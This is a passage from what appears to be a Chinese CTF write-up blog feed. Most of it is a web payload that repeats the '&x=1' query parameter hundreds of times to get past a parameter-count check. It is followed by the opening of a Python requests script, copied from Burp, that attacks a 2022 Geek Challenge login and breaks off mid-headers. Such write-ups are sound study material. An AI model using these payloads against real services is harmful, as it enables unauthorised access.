class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;proxy</span>=<span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>999个</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>2022</tag>
      
      <tag>河南</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022_极客大挑战</title>
    <link href="/2023/01/10/2022-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    <url>/2023/01/10/2022-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
    
    <content type="html"><![CDATA[<p>时间来不及，最后一天打的，只写了一些web</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="登录试试"><a href="#登录试试" class="headerlink" title="登录试试"></a>登录试试</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004014.png" alt="image-20221120101858001"></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004015.png" alt="image-20221119235315845"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8/gbk</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> time<br><br>burp0_url = <span class="hljs-string">&quot;http://121.5.62.30:38001/EasyTime/Syclover&quot;</span><br>burp0_cookies = &#123;<span class="hljs-string">&quot;JSESSIONID&quot;</span>: <span class="hljs-string">&quot;627E869E84314D5F9920798403870F8C&quot;</span>&#125;<br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://121.5.62.30:38001&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span 